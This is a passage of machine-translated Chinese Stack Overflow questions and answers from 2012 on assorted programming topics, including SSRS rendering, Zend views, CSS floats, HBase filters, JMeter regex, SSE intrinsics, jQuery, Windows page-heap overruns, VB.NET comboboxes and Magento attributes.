    newImage.src = "http://server/Reportserver/?%2path%2ftestIMAGE&rs:Command=Render&Refdata=529&rc:Toolbar=false&time=" + new Date() +"&rs:Format=IMAGE&rc:OutputFormat=PNG";
    document.getElementById('updatebkg').style.backgroundImage = newImage.src ;
    }
} 
```

然后像任何 rdl 文件一样将 html 页面上传到 SSRS 门户。最后，您要求通过报告服务器访问（不是报告）呈现您的 html 页面：

```
http://server/Reportserver/?%2fpath%2ftesthtml&rs:Command=GetResourceContents 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T20:38:34.070

我认为没有办法直接在 SSRS 中更改这些标头。您需要编写自己的服务来获取内容并将其与正确的标头一起发送。幸运的是，编写该服务将[非常简单](https://stackoverflow.com/questions/584609/how-to-display-a-reporting-services-report-as-an-inline-pdf-in-a-asp-net-and-c)。

我很高兴知道我错了。如果有一种方法可以改变它，它在 SSRS 配置中隐藏得很深。

# php - 将数据传递给 Zend 视图但不显示，只需要原始 HTML

> ID：13313563
> 
> 赞同：0
> 
> 时间：2012-11-09T18:06:26.320
> 
> 标签：php, zend-framework, layout, dompdf

我正在编写一个实用程序方法，该方法通过 API 调用来获取数据，然后使用该数据填充视图文件：

```
// decode API response
$response = json_decode($sa->response);
// pass data to view
$this->view->paf = $response->response;
// NEED TO GET HTML HERE INSTEAD OF DISPLAYING VIEW
$this->_helper->layout->setLayout('print-nosubmit'); 
```

实际发生的是响应被解码，然后视图（'print-nosubmit'）与 $response 中的数据一起显示。这一切都很好，除了我不想显示视图。我仍然需要使用数据填充视图，但它只是为了获取 HTML（不仅仅是来自“print-nosubmit”的 html，而是在获取数据后来自该文件的 html）传递给 DOMPDF for PDF创建。我（显然）以错误的方式处理这个问题，因为我实际上不想加载布局，但我不知道有一种好的方法来获取 $response 中的数据到该视图，然后只取回原始 HTML .

我确信我可以采取一种方法来完成这项任务，但我需要一个正确方向的指针。

谢谢！

***更新：为了让事情更清楚，'print-nosubmit' 是一个 VIEW 文件，位于 /views/scripts/print-nosubmit.phtml。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T19:16:04.863

在尝试了我能想到的一切之后，我找到了一个解决方案：

```
$this->_helper->layout()->disableLayout();
$this->_helper->viewRenderer->setNoRender(true);
$this->view->addScriptPath(APPLICATION_PATH . '/layouts/scripts/'); //default layout path
$html = $this->view->render('print-nosubmit.phtml'); 
```

我现在有了 print-nosubmit.phtml 在使用 $html 中存储的数据呈现后生成的全部 HTML 内容。

嘘！

# html - css div和浮动定位错误

> ID：13313566
> 
> 赞同：1
> 
> 时间：2012-11-09T18:06:34.950
> 
> 标签：html, css

我有一个布局，它由左侧的菜单和下一个 div 中的主要内容组成。然而，发生的事情是内容 div 似乎没有正确定位。它位于菜单的中间，而不是在顶部正确对齐。作为css的新手，如果有人能指出我的错误，我将不胜感激。请原谅内联样式，但这只是为了学习。我在小提琴上发布了原始代码，但是当我提交我的问题时，消息声明提供内联代码。谢谢

更新：添加图像。

```
<script type="text/javascript">
    $(function() {
        $( "#menu" ).menu();
    });
    </script>

    <script type="text/javascript">
    $(function() {
        $( "#menuevents" ).menu();
    });
    </script>

<ul id="menuevents" style="width:20%;margin-top:5px;float:left;height:auto !important;">
          <div style="padding:255px 0 5px 3px;color:blue;float:left;clear:both;"></div>

        <li><a href="#">Inbox</a></li>
        <li><a href="#">Sent Items</a></li>
        <li><a href="#">Junk Email</a></li>
        <li><a href="#">Deleted Items</a></li>
        <li class="ui-state-disabled"><a href="#">Drafts</a></li>

        <li>
            <a href="#">Delphi</a>
            <ul>
                <li class="ui-state-disabled"><a href="#">Ada</a></li>
                <li><a href="#">Saarland</a></li>
                <li><a href="#">Salzburg</a></li>
            </ul>
        </li>

        <li><a href="#">Saarland</a></li>
        <li>
            <a href="#">Salzburg</a>
            <ul>
                <li>
                    <a href="#">Delphi</a>
                    <ul>
                        <li><a href="#">Ada</a></li>
                        <li><a href="#">Saarland</a></li>
                        <li><a href="#">Salzburg</a></li>
                    </ul>
                </li>
                <li>
                    <a href="#">Delphi</a>
                    <ul>
                        <li><a href="#">Ada</a></li>
                        <li><a href="#">Saarland</a></li>
                        <li><a href="#">Salzburg</a></li>
                    </ul>
                </li>
                <li><a href="#">Perch</a></li>
            </ul>
        </li>
        <li class="ui-state-disabled"><a href="#">Amesville</a></li>

    </ul>

    <ul id="menu" style="width:20%;margin-top:15px;float:left;clear:both;height:auto !important;">

        <li><a href="#">Inbox</a></li>
        <li><a href="#">Sent Items</a></li>
        <li><a href="#">Junk Email</a></li>
        <li><a href="#">Deleted Items</a></li>
        <li class="ui-state-disabled"><a href="#">Drafts</a></li>

        <li>
            <a href="#">Delphi</a>
            <ul>
                <li class="ui-state-disabled"><a href="#">Ada</a></li>
                <li><a href="#">Saarland</a></li>
                <li><a href="#">Salzburg</a></li>
            </ul>
        </li>

        <li><a href="#">Saarland</a></li>
        <li>
            <a href="#">Salzburg</a>
            <ul>
                <li>
                    <a href="#">Delphi</a>
                    <ul>
                        <li><a href="#">Ada</a></li>
                        <li><a href="#">Saarland</a></li>
                        <li><a href="#">Salzburg</a></li>
                    </ul>
                </li>
                <li>
                    <a href="#">Delphi</a>
                    <ul>
                        <li><a href="#">Ada</a></li>
                        <li><a href="#">Saarland</a></li>
                        <li><a href="#">Salzburg</a></li>
                    </ul>
                </li>
                <li><a href="#">Perch</a></li>
            </ul>
        </li>
        <li class="ui-state-disabled"><a href="#">Amesville</a></li>

    </ul>

    <div style="padding-left:1%;float:left;clear:inherit;">&nbsp;</div>

        <div id="main" style="width:25%;border-left:thin solid #cccccc;border-right:thin solid #cccccc;padding:0 0 0 2%;height:500px;float:left;overflow:auto;">
          <br />

          <table id="customers">
            <form <form name="search" action="" method="POST" enctype="application/x-www-form-urlencoded">
            <input type="text" id="mailsearch" name="mailsearch" value="Search" size="40" maxlength="40"  min="" max="" accept=""/>

            </form>
            <br /><br />

    </table>  

        </div> 
```

![在此处输入图像描述](../Images/a99ca951933161f28fcdbdc3686bdac6.png)

[http://jsfiddle.net/jHRgc/7/](http://jsfiddle.net/jHRgc/7/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:10:11.837

`float`从你的`#main`div 中删除。单独的菜单可以浮动，使内容相应地定位。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T21:32:16.010

您应该能够通过删除#main 上不必要的浮动，并为您的两个菜单添加导航包装器来使内容正确浮动。试试这个 CSS：

```
#main{
    border: 1px solid rgba(0,0,0,.25);
    padding: 10px;
}
nav{
    float: left;
}
#menuevents, #menu{
    margin:5px 10px 0 0;
}
#menu{
    margin-top:15px;
}​ 
```

将您的 HTML 更改为：

```
<nav>
  <ul id="menuevents">    
    <li><a href="#">Inbox</a></li>
    <li><a href="#">Sent Items</a></li>
    <li><a href="#">Junk Email</a></li>
    <li><a href="#">Deleted Items</a></li>
    <li class="ui-state-disabled"><a href="#">Drafts</a></li>

    <li>
        <a href="#">Delphi</a>
        <ul>
            <li class="ui-state-disabled"><a href="#">Ada</a></li>
            <li><a href="#">Saarland</a></li>
            <li><a href="#">Salzburg</a></li>
        </ul>
    </li>

    <li><a href="#">Saarland</a></li>
    <li>
        <a href="#">Salzburg</a>
        <ul>
            <li>
                <a href="#">Delphi</a>
                <ul>
                    <li><a href="#">Ada</a></li>
                    <li><a href="#">Saarland</a></li>
                    <li><a href="#">Salzburg</a></li>
                </ul>
            </li>
            <li>
                <a href="#">Delphi</a>
                <ul>
                    <li><a href="#">Ada</a></li>
                    <li><a href="#">Saarland</a></li>
                    <li><a href="#">Salzburg</a></li>
                </ul>
            </li>
            <li><a href="#">Perch</a></li>
        </ul>
    </li>
    <li class="ui-state-disabled"><a href="#">Amesville</a></li>

  </ul>

  <ul id="menu">
    <li><a href="#">Inbox</a></li>
    <li><a href="#">Sent Items</a></li>
    <li><a href="#">Junk Email</a></li>
    <li><a href="#">Deleted Items</a></li>
    <li class="ui-state-disabled"><a href="#">Drafts</a></li>

    <li>
        <a href="#">Delphi</a>
        <ul>
            <li class="ui-state-disabled"><a href="#">Ada</a></li>
            <li><a href="#">Saarland</a></li>
            <li><a href="#">Salzburg</a></li>
        </ul>
    </li>

    <li><a href="#">Saarland</a></li>
    <li>
        <a href="#">Salzburg</a>
        <ul>
            <li>
                <a href="#">Delphi</a>
                <ul>
                    <li><a href="#">Ada</a></li>
                    <li><a href="#">Saarland</a></li>
                    <li><a href="#">Salzburg</a></li>
                </ul>
            </li>
            <li>
                <a href="#">Delphi</a>
                <ul>
                    <li><a href="#">Ada</a></li>
                    <li><a href="#">Saarland</a></li>
                    <li><a href="#">Salzburg</a></li>
                </ul>
            </li>
            <li><a href="#">Perch</a></li>
        </ul>
    </li>
    <li class="ui-state-disabled"><a href="#">Amesville</a></li>    
  </ul>
</nav>
<div id="main" style="">
    <form <form name="search" action="" method="POST" enctype="application/x-www-form-urlencoded">
        <input type="text" id="mailsearch" name="mailsearch" value="Search" size="40" maxlength="40"  min="" max="" accept=""/>
    </form>
</div> 
```

[http://jsfiddle.net/YPXqd/6/](http://jsfiddle.net/YPXqd/6/)

注意：除非绝对必须，否则永远不要使用内联样式。`!important`注意＃2：您应该不惜一切代价避免使用。

# shell - 无法从 hbase 获取 ValueFilter 而不会在 shell 中出错

> ID：13313569
> 
> 赞同：2
> 
> 时间：2012-11-09T18:06:37.647
> 
> 标签：shell, filter

我是 Htable 的新手，我想做一些事情。我正在“测试”表中寻找一个值。我发现我必须使用带有 ValueFilter 功能的过滤器系统。以下是我迄今为止测试过的命令：

`scan 'test',{FILTER=>"ValueFilter(CompareFilter.CompareOp.EQUAL,Bytes.toBytes('test'))"}`

`scan 'test',{FILTER=>"ValueFilter(CompareFilter.CompareOp.EQUAL,'test')"}`

但我每次都看到这个错误：

`ERROR: java.lang.IllegalArgumentException: Incorrect filter string ValueFilter(CompareFilter.CompareOp.EQUAL,Bytes.toBytes('test')`

我的过滤器有什么问题？（前缀过滤器效果很好）

这个也不起作用： [在 hbase shell 上执行 ValueFilter 或 ColumnFilter](https://stackoverflow.com/questions/12634321/doing-a-valuefilter-or-a-columnfilter-on-hbase-shell)

# regex - Jmeter中的正则表达式提取器

> ID：13313571
> 
> 赞同：5
> 
> 时间：2012-11-09T18:06:56.137
> 
> 标签：regex, jmeter

我在 HTTP 请求中有如下响应

```
href="index.php?module=Meetings&action=DetailView&record=ed51c2d9-1958-bd61-cce1-509d30ccd4ac"> 
```

我想获取“记录”的值，但是当我设置

```
Regular Expression : record=(.+?) 
```

只返回“e”。我需要做什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-09T18:09:46.127

那么正则表达式消耗尽可能少（由于`?`）。因此，在接受第一个字符后就满足了。您可能应该让它变得贪婪并限制可能的字符（这样它就不能超过参数的末尾）：

```
record=([a-f0-9-]+) 
```

如果您不知道允许哪些字符作为参数的值，您也可以说，使用除 & 和引号之外的所有字符：

```
record=([^"'&]+) 
```

根据您使用它的位置，您可能需要使用反斜杠转义其中一个引号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-27T11:35:02.850

给定的文本

```
href="index.php?module=Meetings&action=DetailView&record=ed51c2d9-1958-bd61-cce1-509d30ccd4ac"> 
```

正则表达式从给定的文本值中获取记录值

```
record=(.+)" 
```

正则表达式获取以下记录值

```
record=ed51c2d9-1958-bd61-cce1-509d30ccd4ac" 
```

# c++ - 使用 SSE 或 SSE3 在 ushort 数组中添加 uchar 值

> ID：13313572
> 
> 赞同：3
> 
> 时间：2012-11-09T18:06:59.943
> 
> 标签：c++, c, parallel-processing, sse, ushort

我有一个无符号短 dst[16][16] 矩阵和一个更大的无符号字符 src[m][n] 矩阵。

现在我必须访问 src 矩阵并使用[SSE2](http://en.wikipedia.org/wiki/SSE2)或[SSE3](http://en.wikipedia.org/wiki/SSE3)向 dst 添加一个 16x16 子矩阵。

在较旧的实现中，我确信我的总和值永远不会大于 256，所以我可以这样做：

```
for (int row = 0; row < 16; ++row)
{
    __m128i subMat = _mm_lddqu_si128(reinterpret_cast<const __m128i*>(src));
    dst[row] = _mm_add_epi8(dst[row], subMat);
    src += W; // Step to the next row I need to add
} 
```

其中 W 是到达所需行的偏移量。此代码有效，但现在我在 src 中的值更大并且总和可能大于 256，因此我需要将它们存储为 ushort。

我尝试了以下方法，但它不起作用。

```
for (int row = 0; row < 16; ++row)
{
    __m128i subMat = _mm_lddqu_si128(reinterpret_cast<const __m128i*>(src));
    dst[row] = _mm_add_epi16(dst[row], subMat);
    src += W; // Step to the next row I need to add
} 
```

我怎么解决这个问题？

**编辑**

谢谢保罗，但我认为你的偏移量是错误的。我已经尝试过您的解决方案，似乎子矩阵的行被添加到了错误的 dst 行中。我希望正确的解决方案是这样的：

```
for (int row = 0; row < 32; row += 2)
{
    __m128i subMat = _mm_lddqu_si128(reinterpret_cast<const __m128i*>(src));
    __m128i subMatLo = _mm_unpacklo_epi8(subMat, _mm_set1_epi8(0));
    __m128i subMatHi = _mm_unpackhi_epi8(subMat, _mm_set1_epi8(0));
    dst[row] = _mm_add_epi16(dst[row], subMatLo);
    dst[row + 1] = _mm_add_epi16(dst[row + 1], subMatHi);
    src += W;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-10T10:58:40.560

您需要将 16 x 8 位值的向量解压缩为两个 8 x 16 位值的向量，然后将这两个向量添加到您的目的地：

```
for (int row = 0; row < 16; ++row)
{
    __m128i subMat = _mm_lddqu_si128(reinterpret_cast<const __m128i*>(src));
    __m128i subMatLo = _mm_unpacklo_epi8(subMat, _mm_set1_epi8(0));
    __m128i subMatHi = _mm_unpackhi_epi8(subMat, _mm_set1_epi8(0));
    dst[row] = _mm_add_epi16(dst[row], subMatLo);
    dst[row + 1] = _mm_add_epi16(dst[row + 1], subMatHi);
    src += W;
} 
```

# asp.net-mvc - 如何使用 HtmlAgilityPack 解析 html 的多个节点？

> ID：13313580
> 
> 赞同：0
> 
> 时间：2012-11-09T18:07:38.677
> 
> 标签：asp.net-mvc, html-parsing, html-agility-pack

如果有人可以提供帮助，我将不胜感激！我正在尝试解析 Groupon 网站[http://www.groupon.com/browse/chicago?category=activities-and-nightlife的以下页面](http://www.groupon.com/browse/chicago?category=activities-and-nightlife)

```
 var webGet = new HtmlWeb();
  var deal1 = webGet.Load("http://www.groupon.com/browse/chicago?category=activities-and-nightlife"); 
```

我想获得每笔交易的全部内容（即提供折扣）

```
 HtmlNodeCollection content_block = deal1.DocumentNode.SelectNodes("//div[@class = 'deal-list-tile grid_5_third']"); 
```

然后从每个块中我想获得标题、公司名称、位置和价格。

```
foreach(HtmlNode node in content_block)
        {
             string title2 = node.SelectSingleNode("//div[@class = 'deal-title js-permalink']").InnerText;
            string country2 = node.SelectSingleNode("//p[@class = 'merchant-name']").InnerText;
            string location2 = node.SelectSingleNode("//p[@class = 'location']").InnerText;
            string price2 = node.SelectSingleNode("//div[@class = 'price']/span").InnerText;
        } 
```

在这里我感到困惑，我需要将有关交易的所有信息写入 `DbSet<Deal> Deals`，但即使我尝试显示内容，因为`ViewBag.Message = title + country + location + price;`我得到 System.NullReferenceException: Object reference not set to an instance of an object in line with `content_block`。

我做错了什么=（提前谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T21:11:20.140

问题似乎是当没有找到节点而不是空集合时，selectnodes 不返回任何内容或返回 null。所以这意味着你可能应该环绕`if (content_block != null) {`上面的代码块。

# jquery - 更改事件未在 ipad 上触发

> ID：13313581
> 
> 赞同：0
> 
> 时间：2012-11-09T18:07:41.910
> 
> 标签：jquery, ipad, onchange

我在世界上的每个浏览器上都有这个页面（firefox，safari，chrome，opera，也许我的微波炉菜单也是如此）......在 ipad 上，事件更改似乎没有被触发......我想做的是计算 bmi 字段并用计算值填充它，qhich 取决于“altezza”和“peso”的值。我正在使用jquery mobile，它在这个页面上似乎也有一点崩溃，因为当我选择“比索”的文本字段时，页脚仍然停留在页面的中间而不是在页面的末尾。没有 javascript 或 php 错误被抛出。我正在使用萤火虫。

```
<script type="text/javascript">
jQuery("div:jqmData(role='page'):last").bind('pageinit', function(){
var altezza;
var peso;
// CALCOLO BMI
function roundNumber(num, dec) {
    var result = Math.round(num*Math.pow(10,dec))/Math.pow(10,dec);
    return result;
}
function calcolaBmi(){
    var altezzaBMI=$("#altezza").val();
    var pesoBMI=$("#peso").val();

    if(altezzaBMI!="" || pesoBMI!=""){
        alert("calcolo"+$("#peso").val());
    }
    if(altezzaBMI=="" || pesoBMI==""){
        $("#bmi").val("");
    }else{
        altezzaBMI=parseFloat($("#altezza").val());
        pesoBMI=parseFloat($("#peso").val());
        bmi=pesoBMI/(Math.pow(altezzaBMI/100,2));
        $("#bmi").val(roundNumber(bmi,2));
        alert("Altezza:"+altezzaBMI+" Peso:"+pesoBMI+" "+bmi);          
    }
}

$("input[name=altezza]").change(function () {
    calcolaBmi();
});
$("input[name=peso]").change(function () {
    calcolaBmi();
});
}
</script> 

<div data-role="content"> 
 <form action="#" id="Scheda2Form" class="validate">
  <div data-role="fieldcontain">  
  <label for="altezza">1\. Altezza (in centimetri):</label>
  <input type="text" name="altezza" id="altezza" onkeyup="this.value=this.value.replace(/[^\d]/,'')" value="" />
  </div>
  <div data-role="fieldcontain"> 
  <label for="peso">Peso (in chilogrammi):</label>
  <input type="text" name="peso" id="peso" onkeyup="this.value=this.value.replace(/[^\d]/,'')"  value="" />
  </div>
  <div data-role="fieldcontain"> 
  <label for="bmi">BMI:</label>
  <input type="text" name="bmi" id="bmi" value=""/>
  </div> 
```

可能是什么问题？

# jquery - 条件行格式化两个连续行中具有不同值的 jQuery 单元格

> ID：13313586
> 
> 赞同：0
> 
> 时间：2012-11-09T18:08:00.503
> 
> 标签：jquery

需要以不同于其他单元格的不同格式对连续行中的单元格进行着色。条件原始格式

伪代码将类似于：

```
foreach oddrow in table
    foreach cell in row
        if cellvalue != previosCellvalue(previous even)
              color differently 
```

例如：

```
<table>
   <tr>
      <td>1</td><td>2</td>
   </tr>
      <td>1</td><td>3</td>
   <tr>
      <td>2</td><td>4</td>
   </tr>
   <tr>
      <td>2</td>4<td></td>
   </tr>
</table> 
```

在上面的表格中，第一行第二单元格和第二行第二单元格的样式将不同，所有其他将保留其样式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:27:29.963

你用 jQuery 标记了它，所以一个解决方案是：http: [//jsfiddle.net/kWeNY/](http://jsfiddle.net/kWeNY/)

```
var last, inner;
$('table tr').each(function(i,tr) {
    inner = $.trim($(tr).html());
    if (inner == last) {
        $(tr).css('background-color', 'red');
    }
    last = inner;    
});​ 
```

好。使用您的附加伪算法，您还可以只检查每一行：http: [//jsfiddle.net/gbw49/](http://jsfiddle.net/gbw49/)

```
var last, inner;
$('table tr').each(function(i,tr) {
    inner = $.trim($(tr).html());
    if (inner == last && i % 2) {
        $(tr).css('background-color', 'red');
    }
    last = inner;    
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:19:01.047

尝试使用

```
$('table tr td:nth-child(2)') 
```

像这样添加CSS：

```
$(document).ready(function () {
        $('table tr td:nth-child(2)').css("background", "red");
        $('table tr td:nth-child(2)').css("color", "blue");

    }); 
```

如果您只想对第 1 行和第 2 行执行此操作，请尝试

```
$(document).ready(function () {
         $('table tr:eq(0) td:nth-child(2)').css("background", "green");
         $('table tr:eq(1) td:nth-child(2)').css("background", "green");
    }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:57:43.390

检查这个。我希望我的问题正确
[http://jsfiddle.net/kWeNY/1/](http://jsfiddle.net/kWeNY/1/)

```
 $('table tr:nth-child(even) td:eq(1)').each(function()
        {
            var  firstVal = $(this).text();
            var firstTd = $(this).closest("tr").prev().find("td:eq(1)");
             var secondVal = firstTd.text();
            if(firstVal != secondVal)
            {
                $(this).css({"background-color":"red"});
                firstTd. css({"background-color":"red"}); 
            }
        }
    ); 
```

# c - 在 buf = malloc(1) 与整页堆之后，为什么直到 buf[16] 被覆盖才抛出保护页异常？

> ID：13313587
> 
> 赞同：-5
> 
> 时间：2012-11-09T18:08:03.370
> 
> 标签：c, windows, heap-memory, windbg, pageheap

1.  错误中的代码

    ```
    int main()
    {
        void *ptr = 0;    
        int overrun = 1;
        ptr = malloc(overrun);
        while(overrun++)
        {
            if(!ptr)
                while(1) Sleep(500);
            *((char*)ptr + (overrun+1)) = 'a';
            printf("\n%d\n",overrun);
        }
        return 0;
    } 
    ```

2.  从 Visual Studio 2010 的项目菜单中确保构建为“Release”和“x64”（机器为 x64）

3.  启用整页堆

    ```
    gflags /p /enable test.exe /full 
    ```

4.  使windbg默认调试器

    ```
    E:\installed\Debugging Tools for Windows (x64)>windbg -I 
    ```

5.  `cmd`在没有调试器的情况下将代码作为单独的 exe 运行

    输出：

    ```
    2
    3
    4
    5
    6
    7
    8
    9
    10
    11
    12
    13
    14 
    ```

    之后，windbg 被发现腐败。而且我认为整页堆应该可以立即捕获损坏。

    关于为什么整页堆很烂的任何评论？

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-11-09T18:49:12.567

由于堆分配需要对齐，因此在发生溢出时无法捕获未跨越对齐边界的溢出，因为内存保护是页粒度的，而不是字节粒度的。这是硬件限制。当您释放内存并检查尾字节是否被篡改时，将检测到溢出。

（顺便说一句，说某事很糟糕，会让你指责的那个人不太可能费心帮助你解决问题。只是一个小费。）

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-09T18:58:59.847

扩展雷蒙德的回应。如果您在调试器中查看通过 malloc 返回的原始指针，您将看到它距页面末尾 16 个字节。这是因为 x64 上的 HeapAlloc 对齐要求是 16 字节。因此，它将您要求的 1 个字节尽可能靠近页面的末尾。一旦你离开页面的末尾，你就会出错。

# vb.net - VB.net Windows 窗体（使用 Access 数据库）在文本框中显示选定的组合框项

> ID：13313588
> 
> 赞同：0
> 
> 时间：2012-11-09T18:08:07.227
> 
> 标签：vb.net

您好，这一切都有些紧迫，因为这项任务将于 2012 年 11 月 12 日星期日午夜到期

我附上了我需要帮助的内容，即选择一个组合框项目，然后将数据显示在下面的文本框中

我真的不知道如何处理它我双击组合框，这就是我开始尝试让 ID 显示。我没有尝试过其他任何事情。我评论了我尝试过的东西，因为它不起作用。

```
Public Class AppointmentsForm
    Private aAppointments As New Appointments

    'Instance of customers
    Private aCustomers As New Customers

    Private Sub AppointmentsForm_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        'Combobox must always have a DataSource, Display Member, and Value Member
        'Load the ComboBox with customer name

        cboCustomer.DataSource = aCustomers.Items
        cboCustomer.DisplayMember = "CustName"
        cboCustomer.ValueMember = "CustId"
        cboCustomer.SelectedIndex = -1   'no items selected

        ' load the datagridview
        ApptDataGridView.DataSource = aAppointments.Items

        'do not show TypeID

        ApptDataGridView.Columns(1).Visible = False
        '.Columns(1) TypeID has index of 1 as it is Column 2 in the data sources

    End Sub

    Private Sub btnDelete_Click(sender As System.Object, e As System.EventArgs) Handles btnDelete.Click
        'make sure that a record is selected first
        If ApptDataGridView.SelectedRows.Count > 0 Then
            Dim apptid As Integer
            apptid = ApptDataGridView.SelectedRows(0).Cells(0).Value

            'Delete selected record by calling the delte function
            aAppointments.Delete(apptid)
        End If
    End Sub

    Private Sub btnEdit_Click(sender As System.Object, e As System.EventArgs) Handles btnEdit.Click
        'make sure row is selected get that row from the table ..... need to find by ID
        'This is a query which you will create in the class
        'Transfer information from that row to the form, display the form
        If ApptDataGridView.SelectedRows.Count > 0 Then
            modAppointmentsForm.ApptID = ApptDataGridView.SelectedRows(0).Cells(0).Value
            modAppointmentsForm.ShowDialog()
        End If
    End Sub
End Class 
```

这是任命课程：

公开课预约

```
Public adapter As New CompanyDataSetTableAdapters.SalesStaffTableAdapter

'error variable
Public Shared Property LastError As String

Public ReadOnly Property Items() As DataTable
    Get
        Dim table As DataTable = adapter.GetData
        'sorted by Appointment id
        table.DefaultView.Sort = "ID"
        Return table
    End Get
End Property

'create a function to combine date and time
Public Shared Function CombinedDateTime(aDate As DateTime, aTime As DateTime) As DateTime
    'declare timespan variable
    Dim tsDate As New TimeSpan(aTime.Hour, aTime.Minute, 0)
    Return aDate.Add(tsDate)

End Function 
```

这是针对客户的课程：

公开课客户

```
'create a object variable (tableadapter)
'this will be used to creat instances of this class in the form

Private adapter As New CompanyDataSetTableAdapters.SalesStaffTableAdapter

'property to return a table using the GetData method
Public ReadOnly Property Items() As DataTable
    Get
        Dim table As DataTable = adapter.GetData
        table.DefaultView.Sort = "First_Name"
        Return table
    End Get
End Property

'create a function to filter the customers by custid
Public Function GetByCustomerId(custid As Short) As DataTable
    Dim table As DataTable = adapter.GetData 'entire table
    'filter to get desired row(s)
    table.DefaultView.RowFilter = " ID = " & custid
    Return table

End Function 
```

结束类

这是带有组合框和文本框的表单代码，例如 ID、姓氏、名字等。选择组合框项目时需要显示数据。再次显示 ID 时我写： IDTextBox.Text = SalesStaffComboBox.SelectedValue.ToString 但如果我对其他文本框（LastName.Text = SalesStaffComboBox.SelectedValue.ToString ***_* ____** FirstName.Text = SalesStaffComboBox.SelectedValue.ToString ) ID 号码也显示在其中。

Public Class frmUpdateSalary '所需类的实例 Private aCustomers 作为新客户 Private aAppointments 作为新约会

```
Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
    Me.Close()
End Sub

Private Sub frmUpdateSalary_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    SalesStaffComboBox.DataSource = aCustomers.Items
    SalesStaffComboBox.DisplayMember = "First_Name"
     SalesStaffComboBox.ValueMember = "ID"

End Sub

Private Sub SalesStaffComboBox_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SalesStaffComboBox.SelectedIndexChanged
    'fill the textboxes
    'Populate ID textbox with selected customer

    IDTextBox.Text = SalesStaffComboBox.SelectedValue.ToString

    End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T20:38:45.943

您的组合框每个项目都有两个数据变量，即值和显示。
因此，对于每个客户，您都有姓名和他的 ID（您不指定它是姓氏还是名字）。
如果在它的文本框中你说：

```
txtID.Text=cbo.SelectedValue.ToString
txtLastName.Text=cbo.SelectedValue.ToString
txtFirstName.Text=cbo.SelectedValue.ToString 
```

每个文本框都会得到相同的结果，因为左侧总是相同的。如果在您的组合框中，显示值是 LastName 和 FirstName 的组合，您可以拥有：

```
txtID.Text=cbo.SelectedValue.ToString
txtName.Text=cbo.SelectedText.ToString 
```

我在没有视觉工作室的情况下写作，如果我有任何小错误，请见谅

您没有解释什么是客户，但我想客户的全部信息都在那里。因此，您可以使用已有的 id 检索数据。
如果您提供更多信息，我们可以提供帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:21:03.037

从组合框、列表框或下拉列表中选择一个值。

```
 If cmbBox.selectedIndex <> -1 Then
     comboIndex = cmbBox.selectedIndex
 End Else

 cmbBox.Items.removeAt(x) 
```

删除所选索引处的项目

```
 If cmbBox.selectedIndex <> -1 Then
     comboItem= cmbBox.SelectedItem() 
```

没有 VS10 来检查这些是否是正确的方法名称或大写但它本质上是它

# android - Android - 用于映射或图片的数据库设计？

> ID：13313589
> 
> 赞同：1
> 
> 时间：2012-11-09T18:08:07.813
> 
> 标签：android, database, sqlite, map

我需要你的帮助来设计我的数据库。

我有 2 个旋转器；每个都有 10 个值。

第一个微调器的每个值都与另一个微调器的 10 个值相关。换句话说，它就像一个地图路径，所以当你在第一名时，你的选项是来自另一个微调器的 9 个选项，如果你明白我的意思，每个选项都有一个特定的图片。

选项 2（来自第一个微调器）有 9 个选项（来自第二个微调器）等等。

所以会有将近100张图片。

我在考虑 10 张桌子.....第一个微调器的每个选项都有另一个选项 9

现在我需要你的帮助来设计我的数据库。任何与该主题相关的想法都会很棒。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:12:45.797

你想要一张桌子，而不是十张。

```
Table: SpinnerMapping
Spinner1    INTEGER NOT NULL CHECK(Spinner1 BETWEEN 1 AND 10)
Spinner2    INTEGER NOT NULL CHECK(Spinner2 BETWEEN 1 AND 10)
Picture     ...image type...  NOT NULL
PRIMARY KEY(Spinner1, Spinner2) 
```

# magento - Magento 升级脚本创建的新属性的可见性

> ID：13313593
> 
> 赞同：5
> 
> 时间：2012-11-09T18:08:20.933
> 
> 标签：magento, attributes

我正在尝试在模块升级脚本中以编程方式添加自定义属性。该脚本运行良好并创建新属性（即，一旦脚本运行，它就会出现在目录->属性->管理属性下的 Magento 管理列表中）。

起初我正在使用该类`Mage_Eav_Model_Entity_Setup`（如此处所推荐[的，](https://stackoverflow.com/questions/10147847/creating-attribute-sets-and-attributes-programmatically)并且“可见”和“应用到”字段都没有按预期设置（“可见”始终为假，“应用到”保持为“所有产品类型”而不是使用脚本中提供的列表）。

然后我发现[了这个](https://stackoverflow.com/questions/12928298/adding-custom-product-attributes-in-magento-using-setup-script)，它解释了我应该使用它`Mage_Catalog_Model_Resource_Setup`，并且解决了“apply_to”的问题。

但我仍然无法将属性的“可见”属性设置为 true。如果有人知道为什么“可见”属性仍未设置，我将非常感激听到，谢谢！

这是我的升级脚本代码：

```
$updater = $this;      // $this is class Mage_Eav_Model_Entity_Setup
$updater->startSetup();
$updater->addAttribute('catalog_product', 'my_test_attribute', array(
    'label'             => 'My Test Attribute',
    'type'              => 'int',
    'input'             => 'select',
    'global'            => Mage_Catalog_Model_Resource_Eav_Attribute::SCOPE_GLOBAL,
    'apply_to'          => 'simple,configurable',
    'group'             => 'General',
    'visible'           => true,
    'required'          => true,
    'user_defined'      => true,        
));
$updater->endSetup(); 
```

